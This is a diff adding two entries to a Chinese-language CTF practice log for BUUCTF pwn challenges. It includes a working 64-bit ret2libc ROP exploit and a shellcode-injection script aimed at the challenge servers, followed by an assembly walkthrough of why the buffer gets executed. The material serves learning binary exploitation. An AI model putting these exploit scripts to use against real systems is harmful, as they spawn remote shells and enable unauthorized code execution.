@@ -1,3 +1,5 @@
+
+
 # buuctf刷题记录（21-40题）
 
 ## 21_铁人三项（第五赛区) _2018_rop
@@ -544,3 +546,138 @@ p.interactive()
 
 
 
+## 34 jarvisoj_level3_x64
+
+64位的`ret2libc`从栈传参变成了寄存器传参
+
+```python
+
+from pwn import *
+from LibcSearcher import *
+p = remote('node5.buuoj.cn',28910)
+#p=process('./pwn')
+elf = ELF('./pwn')
+rdi_add = 0x4006b3
+rsir15_add = 0x4006b1
+write_plt = elf.plt['write']
+write_got = elf.got['write']
+vul_add = elf.symbols['vulnerable_function']
+
+payload = b'a'*0x80 + b'a'*0x8
+payload1=payload+p64(rdi_add)+p64(0x1)+p64(rsir15_add)+p64(write_got)+b'deadbeef'+p64(write_plt)+p64(vul_add)
+p.recvuntil("Input:\n")
+p.sendline(payload1)
+write_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
+libc=LibcSearcher('write',write_addr)
+libc_base=write_addr-libc.dump('write')
+sys_add = libc_base + libc.dump('system')
+binsh_add =libc_base+libc.dump('str_bin_sh')
+payload2 = payload + p64(rdi_add) + p64(binsh_add) + p64(sys_add)
+p.sendline(payload2)
+p.interactive()
+```
+
+## 35 mrctf2020_shellcode
+
+ida没法反编译了，这次读汇编（其实只要传入shellcode就行）
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',26947)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+shellcode = asm(shellcraft.sh())
+p.sendline(shellcode)
+p.interactive()
+```
+
+接下来看一下汇编
+
+![image-20250201215315053](./images/image-20250201215315053.png)
+
+```assembly
+buf= byte ptr -410h	;buf 表示相对于基指针 rbp 偏移量为 -410h 的一个字节内存位置
+var_4= dword ptr -4	;var_4 表示相对于基指针 rbp 偏移量为 -4 的一个双字（32 位，4 字节）内存位置
+```
+
+```assembly
+push    rbp
+mov     rbp, rsp
+sub     rsp, 410h
+```
+
+这里是开辟0x410字节空间的栈
+
+中间一部分应该是缓冲区设置，没看懂，但也不需要看懂，跳过
+
+```assembly
+lea     rdi, s          ; "Show me your magic!"
+call    _puts
+```
+
+- `lea rdi, s`：将字符串 `"Show me your magic!"` 的地址加载到 `rdi` 寄存器中，作为 `_puts` 函数的参数。
+
+- `call _puts`：调用 `_puts` 函数输出字符串，并自动添加换行符。
+
+```assembly
+lea     rax, [rbp+buf]
+mov     edx, 400h       ; nbytes
+mov     rsi, rax        ; buf
+mov     edi, 0          ; fd
+mov     eax, 0
+call    _read
+```
+
+- `lea rax, [rbp+buf]`：计算相对于基指针 `rbp` 偏移量为 `-410h` 的内存地址，并将其加载到 `rax` 寄存器中，作为读取数据的缓冲区地址。
+- `mov edx, 400h`：将读取的最大字节数 `400h` 加载到 `edx` 寄存器中。
+- `mov rsi, rax`：将缓冲区地址传递给 `_read` 函数的第二个参数。
+- `mov edi, 0`：将文件描述符 `0`（标准输入）传递给 `_read` 函数的第一个参数。
+- `mov eax, 0`：将返回值寄存器 `eax` 清零。
+- `call _read`：调用 `_read` 函数从标准输入读取最多 `400h` 字节的数据到缓冲区中。
+
+```assembly
+mov     [rbp+var_4], eax
+cmp     [rbp+var_4], 0
+jg      short loc_11D6
+```
+
+- `mov [rbp+var_4], eax`：将 `_read` 函数的返回值（实际读取的字节数）保存到相对于基指针 `rbp` 偏移量为 `-4` 的内存位置（var_4)
+- `cmp [rbp+var_4], 0`：比较实际读取的字节数是否为 `0`，用于后续的条件判断。
+- `jg`基于前面 `cmp [rbp+var_4], 0` 指令设置的标志位进行判断。`[rbp+var_4]` 中存储的是 `_read` 函数实际读取的字节数，如果这个值大于 0，程序就会跳转到 `loc_11D6` 标签处继续执行；如果不满足条件（即读取的字节数小于等于 0），则继续顺序执行下一条指令。
+
+**若失败，即无读入（左边）**
+
+```assembly
+mov     eax, 0
+jmp     short locret_11E4
+```
+
+- `mov eax, 0`：将寄存器 `eax` 赋值为 0。在很多系统调用和函数返回中，`eax` 通常用于存储返回值，这里将其置为 0 表示程序以正常状态退出或者操作失败的返回码。
+- `jmp short locret_11E4`：无条件跳转到 `locret_11E4` 标签处，跳过后续代码直接进入函数返回流程。
+
+**若成功，即有读入（右边）**
+
+```assembly
+loc_11D6:                               ; CODE XREF: main+78↑j
+lea     rax, [rbp+buf]
+call    rax
+mov     eax, 0
+```
+
+- `loc_11D6`：这是一个代码标签，当满足 `jg` 跳转条件时会跳转到这里。
+- `lea rax, [rbp+buf]`：`lea` 是加载有效地址指令，这里将相对于基指针 `rbp` 偏移量为 `-410h`（前面定义的 `buf`）的内存地址加载到 `rax` 寄存器中。
+- `call rax`：这是一个间接调用指令，它会将程序控制权转移到 `rax` 寄存器所指向的地址处执行代码。
+- `mov eax, 0`：同样将寄存器 `eax` 赋值为 0，可能用于表示函数的正常返回状态。
+
+**综上，可以很清楚的发现，直接往buf里面写入代码之后函数就会直接执行buf里的代码，所以直接注入shellcode就行**
+
+## 36
